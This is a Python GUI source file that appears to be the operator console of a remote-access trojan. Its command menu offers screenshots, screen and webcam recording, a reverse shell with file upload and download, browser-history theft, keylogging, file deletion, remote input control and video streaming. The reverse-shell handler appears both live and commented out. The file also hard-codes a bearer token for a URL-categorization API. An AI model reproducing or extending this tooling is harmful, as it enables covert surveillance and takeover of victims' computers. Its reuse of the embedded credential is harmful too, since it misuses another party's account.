import socket
from tkinter import Tk, Button, Label, StringVar, Entry, Text, END, simpledialog, Frame, ttk, filedialog, messagebox
import threading
import os
import struct
import time
from concurrent.futures import ThreadPoolExecutor
from time import sleep
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import requests
import json
import pandas as pd
from datetime import datetime
import cv2
import numpy as np
from PIL import Image, ImageTk


# Global variable
# 鎖用於同步
lock = threading.Lock()
client_socket = None
video_thread = None
video_running = False  # 標誌以防止多次啟動視頻線程

# 接受 server 回傳的資料
def receive_file():
    while True:  # 永久循环以持续接收文件
        fileinfo_size = struct.calcsize('128sl')

        # 確保接收到足夠的數據
        buf = b''
        while len(buf) < fileinfo_size:
            packet = client_socket.recv(fileinfo_size - len(buf))
            if not packet:
                raise ConnectionError("Connection lost while receiving file info")
            buf += packet

        if len(buf) == fileinfo_size:
            filename, filesize = struct.unpack('128sl', buf)
            filename = filename.strip(b'\x00').decode()

            timestamp = time.strftime("%Y%m%d_%H%M%S")
            directory = os.path.join('./received_files', time.strftime("%Y/%m%d"))
            os.makedirs(directory, exist_ok=True)

            base, ext = os.path.splitext(filename)
            new_filename = os.path.join(directory, f"{timestamp}_{base}{ext}")

            recvd_size = 0
            with open(new_filename, 'wb') as file:
                while recvd_size < filesize:
                    chunk_size = min(filesize - recvd_size, 1024)
                    data = client_socket.recv(chunk_size)
                    if not data:
                        print("Connection lost during file transfer")
                        break
                    recvd_size += len(data)
                    file.write(data)

            # 確認結束標誌
            end_marker = client_socket.recv(1024)
            if end_marker != b"END":
                print(f"Unexpected end marker: {end_marker}")

            print(f"{new_filename} 接收完")
            append_log(f"文件接收完: {new_filename}")
        else:
            print(f"Received data of incorrect size: expected {fileinfo_size}, got {len(buf)}")

def receive_video_stream(host, port, video_label):
    global video_running
    video_running = True

    try:
        # 設置伺服器套接字
        v_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        v_socket.bind((host, port))
        v_socket.listen(1)
        print(f"正在監聽 {host}:{port}...")
        conn, addr = v_socket.accept()
        print(f"已連接到 {addr}")

        while video_running:
            try:
                # 接收畫面大小
                data = conn.recv(4)
                if not data:
                    print("未收到畫面大小資料，停止視頻流接收")
                    break
                frame_size = int.from_bytes(data, byteorder='big')

                # 接收畫面數據
                frame_data = b""
                while len(frame_data) < frame_size:
                    packet = conn.recv(frame_size - len(frame_data))
                    if not packet:
                        print("接收畫面數據時連接中斷")
                        video_running = False
                        break
                    frame_data += packet

                if len(frame_data) == frame_size:
                    # 轉換為 numpy 陣列並顯示
                    frame = np.frombuffer(frame_data, dtype=np.uint8).reshape((480, 640, 3))  # 根據需要調整形狀
                    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    image = Image.fromarray(rgb_frame)
                    photo = ImageTk.PhotoImage(image=image)

                    # 使用 thread-safe 的方式更新 GUI
                    video_label.after(0, update_video_label, video_label, photo)
                else:
                    print(f"接收的數據大小不正確: expected {frame_size}, got {len(frame_data)}")

            except Exception as e:
                print(f"更新畫面時出錯: {e}")
                break

    except Exception as e:
        print(f"視頻流接收發生錯誤: {e}")

    finally:
        v_socket.close()
        video_running = False
        print("視頻流接收線程已結束")

def update_video_label(label, photo):
    label.config(image=photo)
    label.image = photo  # 保持對圖像的引用

# 分類 URL
def categorize_url(url):
    api_url = "https://www.klazify.com/api/categorize"
    payload = json.dumps({"url": url})
    headers = {
        'Accept': "application/json",
        'Content-Type': "application/json",
        'Authorization': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiNzkwNmU2MDdhNTUzYTVhYWRjODc0OWQ3ZDcwNTQ2ZDFhZDJhZjg1OWFlNWFiZGI5ODA0MGE3NDI2YzA4N2EwZjRmNzc1MGM0ZTIzY2FhY2MiLCJpYXQiOjE3MjgxODg2ODQuNDQ1NTE4LCJuYmYiOjE3MjgxODg2ODQuNDQ1NTIsImV4cCI6MTc1OTcyNDY4NC40NDAwNzMsInN1YiI6IjEzMTYwIiwic2NvcGVzIjpbXX0.DBTIUBY214HphvElBKEjbAha2RZbzWodQRx68UQoBRFEhtsZLbXlmLCebkypZ0XGVJQz4ygwEtTmnpf-cSC83BmltvlwyHSv8Pk37wE7Zkqf-7gw138an9Gckqra9Yn1U-5mbVZxS7vsK8BihD5it8rSUIhYqa9UChg6gPJfIsqInOSs0Aa7UBdiDPPbZsoOrhfHex3tvDY1t3hFwNYs4pIrQyXJjhGVmGnWXcPieQTUe2aLdhQ5cK3wOe8VbbzSoP8fzcv4kXAnoQP2giGaUoU09QqE3Hrtjmd5sH8MC0CyHug2DTjXME997_H8pjSRAQYGmK93qpyja0_YkK_xoTWH7hed6kRNL_ByOgVolBgbX1CfmQpn8BE4GpBqMdafRRvMdwkObFUU0rex7nEw3ZGrppgNwLqnqwpUP2-cvisebSqfrhTVxl6m5mm-mIgD557FsJTUDV92YO14cxyYs_gpIQDpL0iiHrldtYR9p92lgpS0Ka9VZFCxDZ32BTL8KBPJ1viiAARXsPXr4MovMu_4JGESIXiyKKlTfCwo0VUng0zaASgS8jctHRoFKT9WprWTgZsGbfAoEywW2w-w-tsAn8YodT7VldQVK0Z65hze7qiv75bt-UMFEIjU2pVinI1AdYunpQLgOPMxs3HBLTsifZq74iJ94-ajvuoMtVY",  # 替換為您的訪問密鑰
        'User-Agent': "tianshinLin"
    }

    try:
        response = requests.post(api_url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            print(f"錯誤：{response.status_code} - {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"請求發生錯誤: {e}")
        return None

def process_csv(file_path):
    # 讀取 CSV 檔案
    df = pd.read_csv(file_path, encoding='utf-8-sig')
    df.columns = df.columns.str.strip()  # 去除列名中的空格

    # 創建一個空的類別列
    categories = []

    # 遍歷每一行
    for index, row in df.iterrows():
        url = row['URL']
        print(f"正在處理的 URL: {url}")
        data = categorize_url(url)
        if data and data.get('success'):
            category = next((cat['name'] for cat in data.get('domain', {}).get('categories', []) if cat.get('confidence', 0) >= 0.6), None)
            categories.append(category)
        else:
            categories.append(None)

    # 將類別加入 DataFrame
    df['category'] = categories

    # 生成新的檔案名稱，標記已處理過
    base_name, ext = os.path.splitext(file_path)
    new_file_name = f"{base_name}_已分析_{datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
    
    # 儲存處理後的 DataFrame 為新的 CSV 檔案
    df.to_csv(new_file_name, index=False, encoding='utf-8-sig')

    print(f"已處理的檔案儲存為: {new_file_name}")
    
    # 生成圓餅圖
    generate_pie_chart(df)

    return df

def select_and_process_file():
    """選擇CSV文件並分析"""
    file_path = filedialog.askopenfilename(filetypes=[("CSV files", "*.csv")])
    if file_path:
        try:
            # 進行CSV處理
            processed_df = process_csv(file_path)
            # 在這裡可以將處理結果顯示或保存
            print(processed_df)
            messagebox.showinfo("成功", "文件已成功分析並加入類別！")
        except Exception as e:
            messagebox.showerror("錯誤", f"處理文件時發生錯誤: {e}")

# 定義生成圓餅圖的函數
def generate_pie_chart(df):
    """生成圓餅圖"""
    if 'category' in df.columns:
        category_counts = df['category'].value_counts()

        # 清除先前的圓餅圖
        ax.clear()

        # 創建圓餅圖
        ax.pie(category_counts, labels=category_counts.index, autopct='%1.1f%%', startangle=140, textprops={'fontsize': 6}, radius=0.1)
        ax.set_title('Category Distribution', fontsize=8)
        ax.axis('equal')  # 確保圓餅圖為圓形
        plt.subplots_adjust(left=0.1, right=0.9, top=0.9, bottom=0.1)

        canvas.draw()  # 更新顯示
    else:
        messagebox.showerror("錯誤", "找不到 'category' 列。")

def select_file():
    """選擇CSV文件並生成圓餅圖"""
    file_path = filedialog.askopenfilename(filetypes=[("CSV files", "*.csv")])
    if file_path:
        try:
            # 讀取CSV檔案
            df = pd.read_csv(file_path, sep=',', encoding='utf-8-sig')
            # 去除列名中的空格
            df.columns = df.columns.str.strip()
            generate_pie_chart(df)  # 顯示圓餅圖
        except Exception as e:
            messagebox.showerror("錯誤", f"讀取文件時發生錯誤: {e}")

# def handle_reverse_shell(conn):
#     try:    
#         while True:
#             cmd = simpledialog.askstring("反向 Shell", "請輸入您的命令:")
#             print(cmd)
#             if cmd == "exit":
#                 conn.send(cmd.encode())
#                 break
#             elif cmd.startswith("down"):
#                 conn.send(cmd.encode())
#                 data = b""
#                 while True:
#                     end_data = conn.recv(1024)

#                     # 如果收到 'Ended'，則停止接收
#                     if end_data == b"Ended":
#                         append_log("文件傳輸結束 :)")
#                         break

#                     data += end_data

#                 # 將收到的數據寫入文件
#                 f_name = simpledialog.askstring("輸出文件名", "請輸入輸出文件名:")
#                 if f_name:
#                     with open(f_name, "wb") as new_f:
#                         new_f.write(data)
#                     append_log(f"已將數據寫入文件: {f_name}")
#             elif cmd.startswith("up "):
#                 cmd_list = cmd.split(" ")

#                 file = cmd_list[1]
#                 file = open(file,"rb")
#                 data = file.read()
#                 file.close()

#                 conn.send(cmd.encode())
#                 while True:
#                     if len(data) > 0:
#                         temp_data = data[:1024]
#                         if len(temp_data) < 1024:
#                             temp_data += chr(0).encode() * (1024 - len(temp_data))

#                         data = data[1024:]

#                         conn.send(temp_data)
#                         print("*", end="")
#                     else:
#                         conn.send(b"Ended")
#                         e = conn.recv(1024).decode()
#                         append_log(e)  # Log the response
#                         break
#             elif cmd:
#                 conn.send(cmd.encode())
#                 response = conn.recv(4096).decode()  # Adjust buffer size as needed
#                 print(response)
#                 append_log(response)  # Log the command response
#             else:
#                 append_log("命令不能為空")
#     except (BrokenPipeError, ConnectionResetError, socket.error) as e:
#         append_log(f"反向 shell 期間客戶端斷開: {e}")
#     finally:
#         append_log("退出反向 shell，返回客戶端選擇。")


def handle_reverse_shell(conn):
    try:    
        while True:
            cmd = simpledialog.askstring("反向 Shell", "請輸入您的命令:")
            print(cmd)
            
            if cmd == "exit":
                conn.send(cmd.encode())
                break
            
            elif cmd.startswith("down"):
                conn.send(cmd.encode())
                data = b""
                
                while True:
                    end_data = conn.recv(1024)
                    
                    if end_data == b"Ended":
                        append_log("文件傳輸結束 :)")
                        break
                    
                    data += end_data

                # 獲取文件名並寫入接收到的數據
                f_name = simpledialog.askstring("輸出文件名", "請輸入輸出文件名:")
                if f_name:
                    try:
                        with open(f_name, "wb") as new_f:
                            new_f.write(data)
                        append_log(f"已將數據寫入文件: {f_name}")
                    except IOError as e:
                        append_log(f"寫入文件時出錯: {e}")
                        
            elif cmd.startswith("up "):
                cmd_list = cmd.split(" ")
                
                if len(cmd_list) < 2:
                    append_log("上傳命令不正確，請提供文件名。")
                    continue

                file_name = cmd_list[1]
                
                try:
                    with open(file_name, "rb") as file:
                        data = file.read()
                    
                    conn.send(cmd.encode())
                    while True:
                        if len(data) > 0:
                            temp_data = data[:1024]
                            data = data[1024:]
                            
                            # 發送數據塊
                            conn.send(temp_data + b'\x00' * (1024 - len(temp_data)))
                            print("*", end="")
                        else:
                            conn.send(b"Ended")
                            e = conn.recv(1024).decode(errors='ignore')
                            append_log(e)  # 記錄響應
                            break
                
                except FileNotFoundError:
                    append_log(f"文件未找到: {file_name}")
                except IOError as e:
                    append_log(f"讀取文件時出錯: {e}")
                    
            elif cmd:
                conn.send(cmd.encode())
                response = conn.recv(4096).decode(errors='ignore')  # 根據需要調整緩衝區大小
                print(response)
                append_log(response)  # 記錄命令響應
            
            else:
                append_log("命令不能為空")

    except (BrokenPipeError, ConnectionResetError, socket.error) as e:
        append_log(f"反向 shell 期間客戶端斷開: {e}")
        
    finally:
        append_log("退出反向 shell，返回客戶端選擇。")


def connect_to_server():
    global client_socket
    host = ip_entry.get()
    port = int(port_entry.get())

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
        status_var.set("已連接到伺服器")
        append_log("已連接到伺服器")
        threading.Thread(target=receive_file, daemon=True).start()
    except socket.error as e:
        status_var.set(f"連接錯誤: {e}")
        append_log(f"連接錯誤: {e}")

def send_command():
    if client_socket:
        command = command_combo.get().split(":")[0].strip()  # Get the selected command

        try:
            if command == "1":
                num_shots = simpledialog.askinteger("輸入截圖張數", "請輸入截圖張數:")
                if num_shots is not None:
                    command += f" {num_shots}"

            elif command == "2" or command == "3":
                seconds = simpledialog.askinteger("輸入錄製秒數", "請輸入錄製秒數:")
                if seconds is not None:
                    command += f" {seconds}"
            elif command == "4":
                print("4")
                client_socket.send(command.encode()) 
                status_var.set(f"已發送命令: {command}")
                append_log(f"已發送命令: {command}")
                handle_reverse_shell(client_socket)
            elif command == "5":
                print("瀏覽紀錄")
              
            elif command == "6":
                print('開始鍵盤記錄')

            elif command == "7":
                print('停止鍵盤記錄')

            elif command == "8":
                print('刪除檔案')

            elif command == "9":
                print('刪除檔案 + 刪除')
            
            elif command == 'V':
                if not video_running:
                    client_socket.send(command.encode()) 
                    status_var.set(f"已發送命令: {command}")
                    append_log(f"已發送命令: {command}")
                    # 啟動視頻流接收在新的線程中
                    video_thread = threading.Thread(target=receive_video_stream, args=('0.0.0.0', 5001, video_label), daemon=True)
                    video_thread.start()
                else:
                    messagebox.showinfo("提示", "視頻流已經在接收中。")
                    return

            if command in ['1','2','3','5','6','7','8','9']:
                client_socket.send(command.encode()) 
                status_var.set(f"已發送命令: {command}")
                append_log(f"已發送命令: {command}")

        except Exception as e:
            status_var.set(f"發送命令時出錯: {e}")
            append_log(f"發送命令時出錯: {e}")

def append_log(message):
    log_text.config(state='normal')
    log_text.insert(END, message + "\n")
    log_text.config(state='disabled')
    log_text.yview(END)

def on_closing():
    if client_socket:
        client_socket.close()
    root.destroy()

def disconnect_from_server():
    global client_socket
    if client_socket:
        client_socket.close()
        client_socket = None  # 重置 client_socket
        status_var.set("已斷開與伺服器的連接")
        append_log("已斷開與伺服器的連接")

# Create GUI
root = Tk()
root.title("Client GUI")
root.geometry("1200x800")  # 設定窗口大小
root.configure(bg="#f0f0f0")  # 設定背景顏色

# 連接區域
connection_frame = ttk.LabelFrame(root, text="連接設定")
connection_frame.pack(padx=10, pady=10, fill="x")

# IP entry
ip_label = Label(connection_frame, text="Server IP:", bg="#f0f0f0")
ip_label.grid(row=0, column=0, padx=5, pady=5, sticky="w")
ip_entry = Entry(connection_frame, width=30)
ip_entry.grid(row=0, column=1, padx=5, pady=5)

# Port entry
port_label = Label(connection_frame, text="Server Port:", bg="#f0f0f0")
port_label.grid(row=1, column=0, padx=5, pady=5, sticky="w")
port_entry = Entry(connection_frame, width=30)
port_entry.grid(row=1, column=1, padx=5, pady=5)

# Connect button
connect_button = Button(connection_frame, text="Connect", command=connect_to_server, bg="#4CAF50", fg="white")
connect_button.grid(row=2, column=0, columnspan=2, pady=10)

# Disconnect button
disconnect_button = Button(connection_frame, text="Disconnect", command=disconnect_from_server, bg="#F44336", fg="white")
disconnect_button.grid(row=2, column=2, columnspan=2, pady=10)

# 狀態顯示區域
status_var = StringVar()
status_label = Label(root, textvariable=status_var, bg="#f0f0f0", font=("Arial", 12, "bold"))
status_label.pack(pady=10)

# 命令區域
command_frame = ttk.LabelFrame(root, text="發送命令")
command_frame.pack(padx=10, pady=10, fill="x")

# Command selection
ttk.Label(command_frame, text="選擇命令:").grid(column=0, row=0, padx=5, pady=5, sticky="w")
command_combo = ttk.Combobox(command_frame, state="readonly")
command_combo['values'] = (
    "M: start remote control keyboard",
    "S: stop remote control keyboard",
    "1: screenshots",
    "2: screen recording",
    "3: camera recording",
    "4: reverse shell",
    "5: web history",
    "6: start keylogger",
    "7: stop keylogger",
    "8: file delete",
    "9: close & file delete",
    "10: mouse control",
    "V: start stream video",
    "0: Reset selected server"
)
command_combo.grid(column=1, row=0, padx=5, pady=5, sticky="w")

# Send button
send_button = Button(command_frame, text="發送", command=send_command, bg="#2196F3", fg="white")
send_button.grid(column=0, row=1, columnspan=2, padx=5, pady=10)

# 日誌顯示區域
log_text = Text(root, state='disabled', width=75, height=33, bg="#ffffff")
log_text.pack(side="left", padx=10, pady=10)

# 創建一個框架來放置圓餅圖和按鈕，並放在日誌顯示區域左側
left_frame = Frame(root)
left_frame.pack(side="right", padx=10, pady=10, fill="both", expand=True)

# 創建一個框架來放置圓餅圖
pie_chart_frame = ttk.LabelFrame(left_frame, text="類別圓餅圖")
pie_chart_frame.pack(side="top", padx=6, pady=2, fill="both", expand=True) 

# 創建圓餅圖的圖形和坐標軸
fig, ax = plt.subplots(figsize=(7, 4)) 
canvas = FigureCanvasTkAgg(fig, master=pie_chart_frame)
canvas.get_tk_widget().pack()

# 創建一個新的框架來放置按鈕，並將其放在圓餅圖框架內
button_frame = Frame(pie_chart_frame)
button_frame.pack(side="top", padx=5, pady=5)  # 在圓餅圖框架內

# 選擇文件按鈕
file_button1 = Button(button_frame, text="選擇CSV文件", command=select_file)
file_button1.pack(side="left", padx=5)  # 以左右並排放置

# 選擇分析文件按鈕
file_button2 = Button(button_frame, text="選擇要分析CSV文件", command=select_and_process_file)
file_button2.pack(side="left", padx=5)  # 以左右並排放置

# 創建視頻顯示區域
video_label_frame = ttk.LabelFrame(left_frame, text="視頻流")
video_label_frame.pack(side="top", padx=6, pady=10, fill="both", expand=True)

video_label = Label(video_label_frame)
video_label.pack()

# Set closing behavior
root.protocol("WM_DELETE_WINDOW", on_closing)

# Start the GUI main loop
root.mainloop()

